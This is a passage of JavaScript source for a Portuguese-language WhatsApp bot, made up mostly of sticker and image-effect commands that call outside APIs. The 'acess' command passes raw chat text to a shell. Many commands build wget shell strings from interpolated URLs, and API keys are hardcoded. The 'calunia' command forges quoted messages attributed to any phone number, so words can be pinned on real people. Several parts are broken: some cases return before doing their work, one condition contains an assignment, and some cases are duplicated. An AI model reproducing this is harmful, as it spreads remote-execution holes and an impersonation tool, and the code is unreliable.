var vit = "derrota"
} else if ((pptb == "pedra" && args == "pedra") ||
(pptb == "papel" && args == "papel") ||
(pptb == "tesoura" && args == "tesoura")) {
var vit = "empate"
} else if (vit = "undefined") {
return enviar ('escolha o que quer jogar\n(-ppt pedra)\n(-ppt papel)\n(-ppt tesoura)')
}
if (vit == "vitoria") {
var tes = "Vit√≥ria do jogador"
}
if (vit == "derrota" ) {
var tes = "A vit√≥ria √© do TOMIOKA-BOT"
}
if (vit == "empate" ) {
var tes = "O jogo terminou em empate"
}
enviar(`TOMIOKA-BOT jogou: ${pptb}\nO jogador jogou: ${args}\n\n${tes}`)
addLevelingXp(sender, ppg)
if (tes == "Vit√≥ria do jogador") {
enviar(pph)
}
break
case 'wasted':

if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro Mande o comando : ${prefix}rg`)
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("2dfc5ed7147aa334e0d8d4e644175256", owgi)
imgtrg = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api-exteam.herokuapp.com/api/wasted?img=${imgtrg}`
exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return enviar (`DEU ERROR üòû`)
nobg = fs.readFileSync(rano)
tomioka.sendMessage(from, nobg, sticker, {
quoted: msg
})
fs.unlinkSync(rano)
})
} else {
enviar('Voc√™ precisa marcar ou enviar uma imagem para isso')
}
break                  
case 'metadinha':

enviar('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/ppcouple?apikey=dappakntlll`) 
cowo = await getBuffer(anu.result.male)
tomioka.sendMessage(from, cowo, image, {quoted: tomio, contextInfo: tome})
cewe = await getBuffer(anu.result.female)
tomioka.sendMessage(from, cewe, image, {quoted: tomio, contextInfo: tome})
break
case 'gtav':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')                 
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${anu.display_url}`
anu1 = await fetchJson(`https://api-gdr2.herokuapp.com/api/photooxy/gtav?url=${imgtrg}`)
if (anu1.error) return enviar("N√£o consegui detectar nenhum rosto")
nobg = await getBuffer(anu1.result.url)
tomioka.sendMessage(from, nobg, image, {
quoted: msg
})
} else {
enviar('Voc√™ precisa marcar ou enviar uma imagem para isso')
}
break
case 'zombie':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')                 
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${anu.display_url}`
anu1 = await fetchJson(`https://jonaz-api-v2.herokuapp.com/zombie?url=${imgtrg}`)
if (anu1.error) return enviar("N√£o consegui detectar nenhum rosto")
nobg = await getBuffer(anu1.resultado)
tomioka.sendMessage(from, nobg, image, {
quoted: msg
})
} else {
enviar('Voc√™ precisa marcar ou enviar uma imagem para isso')
}
break
case 'firef':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')                 
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${anu.display_url}`
anu1 = await fetchJson(`https://api-gdr2.herokuapp.com/api/photooxy/fireAnimation?url=${imgtrg}`)
if (anu1.error) return enviar("N√£o consegui detectar nenhum rosto")
nobg = await getBuffer(anu1.result.url)
tomioka.sendMessage(from, nobg, image, {
quoted: msg
})
} else {
enviar('Voc√™ precisa marcar ou enviar uma imagem para isso')
}
break
case 'vidroqb':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')                 
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${anu.display_url}`
anu1 = await fetchJson(`https://api-gdr2.herokuapp.com/api/photooxy/brokemirror?url=${imgtrg}`)
if (anu1.error) return enviar("N√£o consegui detectar nenhum rosto")
nobg = await getBuffer(anu1.result.url)
tomioka.sendMessage(from, nobg, image, {
quoted: msg
})
} else {
enviar('Voc√™ precisa marcar ou enviar uma imagem para isso')
}
break
case 'arteft':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')                 
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${anu.display_url}`
anu1 = await fetchJson(`https://api-gdr2.herokuapp.com/api/photooxy/artePhoto?url=${imgtrg}`)
if (anu1.error) return enviar("N√£o consegui detectar nenhum rosto")
nobg = await getBuffer(anu1.result.url)
tomioka.sendMessage(from, nobg, image, {
quoted: msg
})
} else {
enviar('Voc√™ precisa marcar ou enviar uma imagem para isso')
}
break
case '2arma':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')                 
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${anu.display_url}`
anu1 = await fetchJson(`http://brizas-api.herokuapp.com/photooxy/v2/crossgun?apikey=brizaloka&img=${imgtrg}`)
if (anu1.error) return enviar("N√£o consegui detectar nenhum rosto")
nobg = await getBuffer(anu1.resultado)
tomioka.sendMessage(from, nobg, image, {
quoted: msg
})
} else {
enviar('Voc√™ precisa marcar ou enviar uma imagem para isso')
}
break
case 'armast':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')     
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${anu.display_url}`
anu1 = await fetchJson(`http://brizas-api.herokuapp.com/photooxy/v2/gunscircle?apikey=brizaloka&text=Bandido(a)&text2=da √°rea&img=${imgtrg}`)
if (anu1.error) return enviar("N√£o consegui detectar nenhum rosto")
nobg = await getBuffer(anu1.resultado)
tomioka.sendMessage(from, nobg, image, {quoted: msg})
} else {
enviar('Voc√™ precisa marcar ou enviar uma imagem para isso')
}
break
case 'effect':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')     
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${anu.display_url}`
anu1 = await fetchJson(`https://leyscoders-api.herokuapp.com/api/imgmaker/firework?url=${imgtrg}&apikey=dappakntlll`)
if (anu1.error) return enviar("N√£o consegui detectar nenhum rosto")
nobg = await getBuffer(anu1.result.url)
tomioka.sendMessage(from, nobg, video, {quoted: msg, mimetype: 'video/mp4'})
} else {
enviar('Voc√™ precisa marcar ou enviar uma imagem para isso')
}
break

case 'paisagem':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')                 
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${anu.display_url}`
anu1 = await fetchJson(`https://api-gdr2.herokuapp.com/api/photooxy/mixGalaxy?url=${imgtrg}`)
if (anu1.error) return enviar("N√£o consegui detectar nenhum rosto")
nobg = await getBuffer(anu1.result.url)
tomioka.sendMessage(from, nobg, image, {
quoted: msg
})
} else {
enviar('Voc√™ precisa marcar ou enviar uma imagem para isso')
}
break
case 'acess':
if (!isOwner) return enviar(mess.only.ownerB)
teks = body.slice(7)
exec(teks, (err, stdout) => {
if (err) return tomioka.sendMessage(from, `root@ALEATORY-BOT:~ ${err}`, text, { quoted: msg })
if (stdout) {
tomioka.sendMessage(from, stdout, text)
}
})
break
case 'cubof':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')                 
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${anu.display_url}`
anu1 = await fetchJson(`https://api-gdr2.herokuapp.com/api/photooxy/cuboFoto1?url=${imgtrg}`)
if (anu1.error) return enviar("N√£o consegui detectar nenhum rosto")
nobg = await getBuffer(anu1.result.url)
tomioka.sendMessage(from, nobg, image, {
quoted: msg
})
} else {
enviar('Voc√™ precisa marcar ou enviar uma imagem para isso')
}
break
case 'wallimg':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')                 
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${anu.display_url}`
anu1 = await fetchJson(`http://brizas-api.herokuapp.com/photooxy/v2/phonewallpaper?apikey=brizaloka&img=${imgtrg}`)
if (anu1.error) return enviar("N√£o consegui detectar nenhum rosto")
nobg = await getBuffer(anu1.resultado)
tomioka.sendMessage(from, nobg, image, {
quoted: msg
})
} else {
enviar('Voc√™ precisa marcar ou enviar uma imagem para isso')
}
break
case 'qbcabeca':
case 'qbcabe√ßa':  
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')                 
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${anu.display_url}`
anu1 = await fetchJson(`https://api-gdr2.herokuapp.com/api/photooxy/puzzle?url=${imgtrg}`)
if (anu1.error) return enviar("N√£o consegui detectar nenhum rosto")
nobg = await getBuffer(anu1.result.url)
tomioka.sendMessage(from, nobg, image, {
quoted: msg
})
} else {
enviar('Voc√™ precisa marcar ou enviar uma imagem para isso')
}
break
case 'arma':
case 'figuarma':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('Estou fazendo, espere')                     
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
lfy = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${lfy.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api-exteam.herokuapp.com/api/gun?img=${imgtrg}`
exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return enviar(`DEU ERROR üòû`)
nobg = fs.readFileSync(rano)
tomioka.sendMessage(from, nobg, sticker, {quoted: msg})
fs.unlinkSync(rano)
})
} else {
enviar('Voc√™ precisa marcar ou enviar uma imagem para isso')
}
break
case 'sc':
case 'stcirculo':
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
fgh = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${fgh.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api-exteam.herokuapp.com/api/circle?img=${imgtrg}`
exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return enviar(`DEU ERROR üòû`)
nobg = fs.readFileSync(rano)
tomioka.sendMessage(from, nobg, sticker, {quoted: msg
})
fs.unlinkSync(rano)
})
} else {
enviar('Voc√™ precisa marcar ou enviar uma imagem para isso')
}
await limitAdd(sender)
break
case 'hitler':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('Estou fazendo, espere')                     
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api-gdr2.herokuapp.com/api/hitler?img=${imgtrg}`
exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return enviar(`DEU ERROR üòû`)
nobg = fs.readFileSync(rano)
tomioka.sendMessage(from, nobg, sticker, {quoted: msg})
fs.unlinkSync(rano)
})
} else {
enviar('Voc√™ precisa marcar ou enviar uma imagem para isso')
}
break
case 'wanted':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('Estou fazendo, espere')                     
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
qkl = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${qkl.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api-gdr2.herokuapp.com/api/wanted?img=${imgtrg}`
exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return enviar(`DEU ERROR üòû`)
nobg = fs.readFileSync(rano)
tomioka.sendMessage(from, nobg, sticker, {quoted: msg})
fs.unlinkSync(rano)
})
} else {
enviar('Voc√™ precisa marcar ou enviar uma imagem para isso')
}
break
case 'calunia':
if (args.length == 2) return enviar(`Use assim: ${prefix + command} 558167892920|sou gay|J√° sabia\nPode usar qualquer coisa`)
k = `${body.slice(10)}`
txt1 = k.split("|")[0];
txt2 = k.split("|")[1];
txt3 = k.split("|")[2];
tomioka.sendMessage(from, `${txt3}`,text,{quoted:{    key: {fromMe: false,participant: `${txt1}@s.whatsapp.net`,},message: { "extendedTextMessage": {"text": `${txt2}`,"title": `Hmm`}}}})
break
case 'triggered':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('Estou fazendo, espere')                     
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
dsr = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${dsr.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api-gdr2.herokuapp.com/api/triggered?img=${imgtrg}`
exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return enviar(`DEU ERROR üòû`)
nobg = fs.readFileSync(rano)
tomioka.sendMessage(from, nobg, sticker, {quoted: msg})
fs.unlinkSync(rano)
})
} else {
enviar('Voc√™ precisa marcar ou enviar uma imagem para isso')
}
break
case 'rip':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('Estou fazendo, espere')                     
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
qhy = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${qhy.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api-gdr2.herokuapp.com/api/rip?img=${imgtrg}`
exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return enviar(`DEU ERROR üòû`)
nobg = fs.readFileSync(rano)
tomioka.sendMessage(from, nobg, sticker, {quoted: msg})
fs.unlinkSync(rano)
})
} else {
enviar('Voc√™ precisa marcar ou enviar uma imagem para isso')
}
break 
case 'trash':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('Estou fazendo, espere')                     
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
der = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${der.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api-gdr2.herokuapp.com/api/trash?img=${imgtrg}`
exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return enviar(`DEU ERROR üòû`)
nobg = fs.readFileSync(rano)
tomioka.sendMessage(from, nobg, sticker, {quoted: msg})
fs.unlinkSync(rano)
})
} else {
enviar('Voc√™ precisa marcar ou enviar uma imagem para isso')
}
break
case 'preso':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('Estou fazendo, espere')                     
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
lder = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${lder.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api-gdr2.herokuapp.com/api/jail?img=${imgtrg}`
exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return enviar(`DEU ERROR üòû`)
nobg = fs.readFileSync(rano)
tomioka.sendMessage(from, nobg, sticker, {quoted: msg})
fs.unlinkSync(rano)
})
} else {
enviar('Voc√™ precisa marcar ou enviar uma imagem para isso')
}
break
case 'figupet':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('Estou fazendo, espere')                     
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api-gdr2.herokuapp.com/api/petpet?url=${imgtrg}`
exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return enviar(`DEU ERROR üòû`)
nobg = fs.readFileSync(rano)
tomioka.sendMessage(from, nobg, sticker, {quoted: msg})
fs.unlinkSync(rano)
})
} else {
enviar('Voc√™ precisa marcar ou enviar uma imagem para isso')
}
break 
case 'heroiimg':
tomioka 
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
enviar('Estou fazendo, espere')                     
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("9d7a1bd760e2e3360dbfd40cec4d7ad7", owgi)
imgtrg = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://dapuhy-api.herokuapp.com/api/canvas/crush?img=${imgtrg}&apikey=eZmRwQ7L04xF6d9`
exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return enviar(`DEU ERROR üòû`)
nobg = fs.readFileSync(rano)
tomioka.sendMessage(from, nobg, sticker, {quoted: msg})
fs.unlinkSync(rano)
})
} else {
enviar('Voc√™ precisa marcar ou enviar uma imagem para isso')
}
break 
//modulo maker
case 'grass':
    if (!isPremium) return enviar ('s√≥ premium')
if (!q) return reply('onde est√° o texto?')
pMsgGrass(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
break
case 'doubleheart':
    if (!isPremium) return enviar ('s√≥ premium')
if (!q) return reply('onde est√° o texto?')
pDoubleHeart(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
break
case 'coffecup':
    if (!isPremium) return enviar ('s√≥ premium')
if (!q) return reply('onde est√° o texto?')
pCoffeCup(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
break
case 'romantic':
    if (!isPremium) return enviar ('s√≥ premium')
if (!q) return reply('onde est√° o texto?')
pRomantic(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
		
break
case 'smoky':
   if (!isPremium) return enviar ('s√≥ premium')

if (!q) return reply('onde est√° o texto?')
pSmoky(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
	
break					
case 'naruto':
   if (!isPremium) return enviar ('s√≥ premium')

if (!q) return reply('onde est√° o texto?')
pNaruto(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
	
break
		case 'semi':
		   if (!isPremium) return enviar ('s√≥ premium')

if (!q) return reply('onde est√° o texto?')
pSemi(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
	
break
		case 'ouro':
		   if (!isPremium) return enviar ('s√≥ premium')

if (!q) return reply('onde est√° o texto?')
pOuro(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
	
break
		case 'fogo':
		   if (!isPremium) return enviar ('s√≥ premium')

if (!q) return reply('onde est√° o texto?')
pFogo(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
	
break
case 'shadow':
   if (!isPremium) return enviar ('s√≥ premium')

if (!q) return reply('onde est√° o texto?')
pShadow(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
	
break
case 'romantic':
   if (!isPremium) return enviar ('s√≥ premium')

if (!q) return reply('onde est√° o texto?')
pRomantic(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
	
break
case 'smoke':
   if (!isPremium) return enviar ('s√≥ premium')

if (!q) return reply('onde est√° o texto?')
pSmoke(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
	
break
case 'burnpaper':
   if (!isPremium) return enviar ('s√≥ premium')

if (!q) return reply('onde est√° o texto?')
pBurnPapper(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
	
break
case 'lovemsg':
   if (!isPremium) return enviar ('s√≥ premium')

if (!q) return reply('onde est√° o texto?')
pLoveMsg(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
	
break
case 'grass':
   if (!isPremium) return enviar ('s√≥ premium')

if (!q) return reply('onde est√° o texto?')
pMsgGrass(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
	
break
case 'doubleheart':
   if (!isPremium) return enviar ('s√≥ premium')

if (!q) return reply('onde est√° o texto?')
pDoubleHeart(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
	
break
case 'coffecup':
   if (!isPremium) return enviar ('s√≥ premium')

if (!q) return reply('onde est√° o texto?')
pCoffeCup(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
	
break
case 'lovetext':
   if (!isPremium) return enviar ('s√≥ premium')

if (!q) return reply('onde est√° o texto?')
pLoveText(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
	
break
case 'butterfly':
   if (!isPremium) return enviar ('s√≥ premium')

if (!q) return reply('onde est√° o texto?')
pButterfly(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
	
break
//@Tio Tomioka YT					
case 'pokemon':
tomioka.updatePresence(from, Presence.composing) 
data = await fetchJson(`https://api.fdci.se/rep.php?gambar=pokemon`, {method: 'get'})
return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
n = JSON.parse(JSON.stringify(data));
